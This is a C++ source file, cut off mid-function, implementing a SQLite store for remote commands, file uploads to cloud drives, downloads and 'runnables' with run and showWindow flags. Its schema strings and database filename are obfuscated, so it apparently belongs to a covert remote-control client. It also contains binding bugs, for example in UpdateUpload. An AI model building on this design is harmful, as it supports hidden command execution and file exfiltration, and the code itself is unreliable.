#include "DB.h"
#include "App.h"
#include "Encrypter.h"
#include "Models.h"
#include "memory"
#include <string>
#include <sqlite3.h>
#include <mutex>
using namespace app;
std::shared_ptr<SQLite::Database> db;
std::mutex dbMutex;
std::string getDBPath()
{
    std::string path;
    auto dbName = Encrypter::Encrypt(OBFUSCATED("database.db"));
    if (dbName.size() > 16)
    {
        dbName.resize(16);
    }
    path = (fs::path(GetAssetDir()) /= dbName).string();
    return path;
}

void initializeDB()
{
    dbMutex.lock();
    auto dbPath = getDBPath();
    db = std::make_shared<SQLite::Database>(SQLite::Database(dbPath, SQLite::OPEN_READWRITE | SQLite::OPEN_CREATE));

    // Command
    std::string query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS "Command" (
        "client_id"	TEXT,
        "local_id"	INTEGER NOT NULL UNIQUE,
        "params"	TEXT,
        "type"	INTEGER NOT NULL DEFAULT 0,
        "processed"	INTEGER NOT NULL DEFAULT 0,
        "created_at"	INTEGER NOT NULL,
        "updated_at"	INTEGER NOT NULL,
        "id"	TEXT NOT NULL,
        PRIMARY KEY("local_id" AUTOINCREMENT)
    );
    )");
    int status = db->exec(query);

    // UploadProgress
    query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS  "UploadProgress" (
        "machine_id"	TEXT NOT NULL,
        "path"	TEXT NOT NULL,
        "complete"	INTEGER NOT NULL DEFAULT 0,
        "uploaded"	INTEGER DEFAULT 0,
        "size"	INTEGER NOT NULL DEFAULT 0,
        "state"	INTEGER NOT NULL DEFAULT 0,
        "local_id"	INTEGER NOT NULL,
        "rate"	INTEGER NOT NULL DEFAULT 0,
        "eta"	INTEGER NOT NULL DEFAULT 0,
        "drive_id"	TEXT,
        "error"	TEXT,
        "created_at"	INTEGER NOT NULL,
        "updated_at"	INTEGER NOT NULL,
        "id"	TEXT NOT NULL UNIQUE,
        "stopped"	INTEGER NOT NULL DEFAULT 0,
        "doneWithUpdate"	INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY("local_id" AUTOINCREMENT)
    );
    )");
    status = db->exec(query);
    // DownloadProgress
    query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS "DownloadProgress" (
        "machine_id"	TEXT NOT NULL,
        "name"	TEXT,
        "local_id"	INTEGER NOT NULL,
        "error"	TEXT,
        "downloaded"	INTEGER NOT NULL DEFAULT 0,
        "size"	INTEGER NOT NULL DEFAULT 0,
        "download_type"	INTEGER NOT NULL DEFAULT 0,
        "eta"	INTEGER,
        "complete"	INTEGER NOT NULL DEFAULT 0,
        "resource"	TEXT NOT NULL,
        "rate"	INTEGER,
        "status"	INTEGER,
        "created_at"	INTEGER NOT NULL,
        "updated_at"	INTEGER NOT NULL,
        "id"	TEXT NOT NULL UNIQUE,
        "doneWithUpdate"	INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY("local_id" AUTOINCREMENT)
    );
    )");
    status = db->exec(query);
    // Download
    query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS  "Download" (
        "client_id"	TEXT,
        "link"	TEXT NOT NULL,
        "args"	TEXT,
        "type"	INTEGER,
        "created_at"	INTEGER NOT NULL,
        "updated_at"	INTEGER NOT NULL,
        "id"	TEXT NOT NULL UNIQUE,
        "local_id"	INTEGER NOT NULL,
        "completed"	INTEGER NOT NULL DEFAULT 0,
        "stopped"	INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY("local_id" AUTOINCREMENT)
    );
    )");
    status = db->exec(query);
    // Upload
    query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS  "Upload" (
        "client_id"	TEXT,
        "path"	TEXT NOT NULL,
        "drive_id"	TEXT,
        "type"	INTEGER,
        "created_at"	INTEGER NOT NULL,
        "updated_at"	INTEGER NOT NULL,
        "id"	TEXT NOT NULL UNIQUE,
        "local_id"	INTEGER NOT NULL,
        "completed"	INTEGER NOT NULL DEFAULT 0,
        "stopped"	INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY("local_id" AUTOINCREMENT)
    );
    )");
    status = db->exec(query);

    // runnable
    query = OBFUSCATED(R"(
    CREATE TABLE IF NOT EXISTS  "Runnable" (
        "id"	INTEGER NOT NULL UNIQUE,
        "showWindow"	INTEGER NOT NULL DEFAULT 0,
        "run"	INTEGER NOT NULL DEFAULT 0,
        "name"	TEXT NOT NULL,
        "remoteID"	TEXT,
        "link"	TEXT NOT NULL,
        "downloaded"	INTEGER NOT NULL DEFAULT 0,
        "drive_id"	TEXT,
        "cloudType"	INTEGER NOT NULL DEFAULT 0,
        "created_at"	INTEGER NOT NULL DEFAULT 0,
        "updated_at"	INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY("id" AUTOINCREMENT)
    );
    )");
    status = db->exec(query);
    dbMutex.unlock();
}

std::shared_ptr<Runnable> SaveRunnable(Runnable runnable)
{

    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(INSERT INTO Runnable (showWindow , run , name , remoteID ,link , downloaded , drive_id , cloudType ,created_at ,updated_at) VALUES ( ? , ? , ? , ? , ? , ? , ? , ? , ?, ?))";
    SQLite::Statement statement(*db, queryStr);
    if (runnable.created_at == 0)
    {
        runnable.created_at = getSystemTime();
    }
    else if (getSystemTime() < runnable.created_at)
    {
        runnable.created_at = (int)(runnable.created_at / 1000);
    }
    runnable.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, runnable.showWindow ? 1 : 0);
    statement.bind(2, runnable.run ? 1 : 0);
    statement.bind(3, runnable.name);
    statement.bind(4, runnable.remoteID);
    statement.bind(5, runnable.link);
    statement.bind(6, runnable.downloaded ? 1 : 0);
    statement.bind(7, runnable.drive_id);
    statement.bind(8, (int)runnable.cloudType);
    statement.bind(9, runnable.created_at);
    statement.bind(10, runnable.updated_at);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findRunnable(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Runnable> UpdateRunnable(Runnable runnable)
{
    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    UPDATE Runnable SET showWindow = ? , run = ? , name = ? , remoteID = ? , link = ? , downloaded = ? , drive_id = ? , cloudType = ? , updated_at = ? where id = ?)";
    SQLite::Statement statement(*db, queryStr);

    runnable.updated_at = getSystemTime();

    statement.bind(1, runnable.showWindow ? 1 : 0);
    statement.bind(2, runnable.run ? 1 : 0);
    statement.bind(3, runnable.name);
    statement.bind(4, runnable.remoteID);
    statement.bind(5, runnable.link);
    statement.bind(6, runnable.downloaded ? 1 : 0);
    statement.bind(7, runnable.drive_id);
    statement.bind(8, (int)runnable.cloudType);
    statement.bind(9, (int)runnable.updated_at);
    statement.bind(10, (int)runnable.id);
    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findRunnable(runnable.id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Runnable> findRunnable(int64_t id)
{
    std::shared_ptr<Runnable> result = nullptr;
    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("id", val);

    try
    {
        auto lst = findRunnables(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<Runnable>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Runnable> findRunnables(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Runnable> runnables;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(SELECT * from Runnable)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Runnable runnable = Runnable();

            runnable.id = statement->getColumn(0).getInt();
            runnable.showWindow = statement->getColumn(1).getInt() != 0;
            runnable.run = statement->getColumn(2).getInt() != 0;
            runnable.name = statement->getColumn(3).getString();
            runnable.remoteID = statement->getColumn(4).getString();
            runnable.link = statement->getColumn(5).getString();
            runnable.downloaded = statement->getColumn(6).getInt() > 0;
            runnable.drive_id = statement->getColumn(7).getString();
            runnable.cloudType = (DriveKind)statement->getColumn(8).getInt();
            runnable.created_at = statement->getColumn(9).getInt64();
            runnable.updated_at = statement->getColumn(10).getInt64();

            runnables.push_back(runnable);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return runnables;
}
bool deleteRunnable(int64_t id)
{
    std::string queryStr = R"(
    DELETE from Runnable where id = ?
)";
    SQLite::Statement statement(*db, queryStr);

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, id);
    try
    {

        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}

std::shared_ptr<Command> SaveCommand(Command model)
{

    std::shared_ptr<Command> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO Command ( client_id  , params ,type , processed ,created_at ,updated_at ,id) VALUES ( ? , ? , ? , ? , ? , ? , ? )
)";
    dbMutex.lock();
    SQLite::Statement statement(*db, queryStr);
    if (model.created_at == 0)
    {
        model.created_at = getSystemTime();
    }
    model.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, model.client_id);
    statement.bind(2, model.params);
    statement.bind(3, (int)model.type);
    statement.bind(4, model.processed ? 1 : 0);
    statement.bind(5, model.created_at);
    statement.bind(6, model.updated_at);
    statement.bind(7, model.id);

    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findCommand(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Command> UpdateCommand(Command model)
{

    std::shared_ptr<Command> result = nullptr;
    std::string queryStr = R"(
    UPDATE Command SET  client_id = ? , params = ? , type = ? , processed = ? ,  created_at = ? ,updated_at = ? , id = ? where local_id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    model.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, model.client_id);
    statement.bind(2, model.params);
    statement.bind(3, (int)model.type);
    statement.bind(4, model.processed ? 1 : 0);
    statement.bind(5, model.created_at);
    statement.bind(6, model.updated_at);
    statement.bind(7, model.id);
    statement.bind(8, model.local_id);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findCommand(model.local_id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Command> findCommand(int64_t id)
{
    std::shared_ptr<Command> result = nullptr;
    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("local_id", val);

    try
    {
        auto lst = findCommands(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<app::Command>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Command> findCommands(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Command> commands;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from Command 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Command result;
            result.client_id = statement->getColumn(0).getString();
            result.local_id = statement->getColumn(1).getInt();
            result.params = statement->getColumn(2).getString();
            result.type = (CommandType)statement->getColumn(3).getInt();
            result.processed = statement->getColumn(4).getInt() != 0;
            result.created_at = statement->getColumn(5).getInt64();
            result.updated_at = statement->getColumn(6).getInt64();
            commands.push_back(result);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return commands;
}
bool deleteCommand(int64_t id)
{
    std::string queryStr = R"(
    DELETE from Command where local_id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}

std::shared_ptr<DownloadProgress> SaveDownloadProgress(DownloadProgress instance)
{

    std::shared_ptr<DownloadProgress> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO DownloadProgress (machine_id , name , error ,downloaded ,size , download_type , eta , complete , resource , rate, status ,created_at ,updated_at , id , doneWithUpdate ) VALUES ( ? , ? , ? , ? , ? , ? , ? , ? ,? , ? , ? ,? , ? , ? , ? )
)";
    dbMutex.lock();
    SQLite::Statement statement(*db, queryStr);
    if (instance.created_at == 0)
    {
        instance.created_at = getSystemTime();
    }
    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.machine_id);
    statement.bind(2, instance.name);
    statement.bind(3, instance.error);
    statement.bind(4, instance.downloaded);
    statement.bind(5, instance.size);
    statement.bind(6, instance.download_type);
    statement.bind(7, instance.eta);
    statement.bind(8, instance.complete);
    statement.bind(9, instance.resource);
    statement.bind(10, instance.rate);
    statement.bind(11, (int)instance.status);
    statement.bind(12, instance.created_at);
    statement.bind(13, instance.updated_at);
    statement.bind(14, instance.id);
    statement.bind(15, instance.doneWithUpdate ? 1 : 0);

    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findDownloadProgress(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<DownloadProgress> UpdateDownloadProgress(DownloadProgress instance)
{

    std::shared_ptr<DownloadProgress> result = nullptr;
    std::string queryStr = R"(
    UPDATE DownloadProgress SET machine_id = ? , name = ? , error = ? , downloaded = ? , size = ? , download_type = ?, eta = ?, complete = ? , resource = ? , rate = ? , status = ? , created_at = ? , updated_at = ? , id = ? , doneWithUpdate = ? where local_id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.machine_id);
    statement.bind(2, instance.name);
    statement.bind(3, instance.error);
    statement.bind(4, instance.downloaded);
    statement.bind(5, instance.size);
    statement.bind(6, instance.download_type);
    statement.bind(7, instance.eta);
    statement.bind(8, instance.complete ? 1 : 0);
    statement.bind(9, instance.resource);
    statement.bind(10, instance.rate);
    statement.bind(11, (int)instance.status);
    statement.bind(12, instance.created_at);
    statement.bind(13, instance.updated_at);
    statement.bind(14, instance.id);
    statement.bind(15, instance.doneWithUpdate ? 1 : 0);
    statement.bind(16, instance.local_id);

    dbMutex.lock();
    try
    {
        int rows = statement.exec();
        if (rows > 0)
        {
            result = findDownloadProgress(instance.local_id);
        }
    }
    catch (const std::exception &e)
    {
        std::cerr << e.what() << '\n';
    }

    dbMutex.unlock();
    return result;
}
std::shared_ptr<DownloadProgress> findDownloadProgress(int64_t id)
{
    std::shared_ptr<DownloadProgress> result = nullptr;
    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("local_id", val);

    try
    {
        auto lst = findDownloadProgresses(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<app::DownloadProgress>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<DownloadProgress> findDownloadProgresses(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<DownloadProgress> results;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from DownloadProgress 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            DownloadProgress instance = DownloadProgress();

            instance.machine_id = statement->getColumn(0).getString();
            instance.name = statement->getColumn(1).getString();
            instance.local_id = statement->getColumn(2).getInt64();
            instance.error = statement->getColumn(3).getString();
            instance.downloaded = statement->getColumn(4).getInt64() > 0;
            instance.size = statement->getColumn(5).getInt64();
            instance.download_type = (DownloadStatus)statement->getColumn(6).getInt();
            instance.eta = statement->getColumn(7).getInt64();
            instance.complete = statement->getColumn(8).getInt() > 0;
            instance.resource = statement->getColumn(9).getString();
            instance.rate = statement->getColumn(10).getInt64();
            instance.status = (DownloadStatus)statement->getColumn(11).getInt();
            instance.created_at = statement->getColumn(12).getInt64();
            instance.updated_at = statement->getColumn(13).getInt64();
            instance.id = statement->getColumn(14).getString();
            instance.doneWithUpdate = statement->getColumn(15).getInt() > 0;

            results.push_back(instance);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return results;
}
bool deleteDownloadProgress(int64_t id)
{
    std::string queryStr = R"(
    DELETE from DownloadProgress where local_id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}
std::shared_ptr<Upload> SaveUpload(Upload instance)
{

    std::shared_ptr<Upload> result = nullptr;
    dbMutex.lock();

    try
    {
        std::string queryStr = R"(
    INSERT INTO Upload ( client_id , path , drive_id , created_at ,updated_at , id ) VALUES ( ? , ? , ? , ? , ? , ? )
)";
        SQLite::Statement statement(*db, queryStr);
        if (instance.created_at == 0)
        {
            instance.created_at = getSystemTime();
        }
        instance.updated_at = getSystemTime();

        // Bind the integer value 6 to the first parameter of the SQL query

        statement.bind(1, instance.client_id);
        statement.bind(2, instance.path);
        statement.bind(3, instance.drive_id);
        statement.bind(4, instance.created_at);
        statement.bind(5, instance.updated_at);

        int rows = statement.exec();
        if (rows > 0)
        {
            int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
            if (id > 0)
            {
                result = findUpload(id);
            }
        }

        dbMutex.unlock();
    }
    catch (const std::exception &e)
    {
        dbMutex.unlock();
        std::cerr << e.what() << '\n';
    }

    return result;
}
std::shared_ptr<Upload> UpdateUpload(Upload instance)
{

    std::shared_ptr<Upload> result = nullptr;
    std::string queryStr = R"(
    UPDATE Upload SET client_id = ? , path = ? , drive_id = ? ,created_at = ? , updated_at = ? , id = ? where local_id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.client_id);
    statement.bind(2, instance.path);
    statement.bind(3, instance.drive_id);
    statement.bind(4, instance.created_at);
    statement.bind(6, instance.created_at);
    statement.bind(5, instance.updated_at);
    statement.bind(8, instance.id);
    statement.bind(7, instance.local_id);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findUpload(instance.local_id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Upload> findUpload(int64_t id)
{
    std::shared_ptr<Upload> result = nullptr;

    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("local_id", val);

    try
    {
        auto lst = findUploads(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<app::Upload>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Upload> findUploads(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Upload> results;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from Upload 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Upload instance = Upload();

            instance.client_id = statement->getColumn(0).getString();
            instance.path = statement->getColumn(1).getString();
            instance.drive_id = statement->getColumn(2).getString();
            instance.created_at = statement->getColumn(3).getInt64();
            instance.updated_at = statement->getColumn(4).getInt64();
            instance.id = statement->getColumn(5).getString();
            instance.local_id = statement->getColumn(6).getInt();
            results.push_back(instance);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return results;
}
bool deleteUpload(int64_t id)
{
    std::string queryStr = R"(
    DELETE from Upload where local_id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}
std::shared_ptr<Download> SaveDownload(Download instance)
{

    std::shared_ptr<Download> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO Download ( client_id , link , args , type , created_at ,updated_at , id , completed ,stopped ) VALUES ( ? , ? , ? , ? , ? , ? , ? , ? , ?)
)";
    dbMutex.lock();
    SQLite::Statement statement(*db, queryStr);
    if (instance.created_at == 0)
    {
        instance.created_at = getSystemTime();
    }
    if (instance.updated_at == 0)
    {
        instance.updated_at = getSystemTime();
    }

    // Bind the integer value 6 to the first parameter of the SQL query

    statement.bind(1, instance.client_id);
    statement.bind(2, instance.link);
    statement.bind(3, instance.args);
    statement.bind(4, instance.type);
    statement.bind(5, instance.created_at);
    statement.bind(6, instance.updated_at);
    statement.bind(7, instance.id);
    statement.bind(8, instance.completed ? 1 : 0);
    statement.bind(9, instance.stopped ? 1 : 0);

    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findDownload(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Download> UpdateDownload(Download instance)
{

    std::shared_ptr<Download> result = nullptr;
    std::string queryStr = R"(
    UPDATE Download SET client_id = ? , link = ? , args = ? , type = ? ,created_at = ? , updated_at = ? , id = ? , completed = ? , stopped = ? where local_id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    instance.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, instance.client_id);
    statement.bind(2, instance.link);
    statement.bind(3, instance.args);
    statement.bind(4, instance.type);
    statement.bind(5, instance.created_at);
    statement.bind(6, instance.updated_at);
    statement.bind(7, instance.id);
    statement.bind(8, instance.completed ? 1 : 0);
    statement.bind(9, instance.stopped ? 1 : 0);
    statement.bind(10, instance.local_id);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findDownload(instance.local_id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Download> findDownload(int64_t id)
{
    std::shared_ptr<Download> result = nullptr;
    std::map<std::string, DBValue> q;

    DBValue val;
    val.intValue = std::make_shared<int64_t>(id);
    val.equality = DBEquality::EQUAL;

    q.emplace("local_id", val);

    try
    {
        auto lst = findDownloads(q, 1);
        if (!lst.empty())
        {
            result = std::make_shared<app::Download>(lst[0]);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Download> findDownloads(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Download> results;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from Download 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        int counter = 0;
        queryStr += " where ";
        for (auto &param : params)
        {
            if (counter > 0)
            {
                queryStr += " AND ";
            }
            counter++;
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
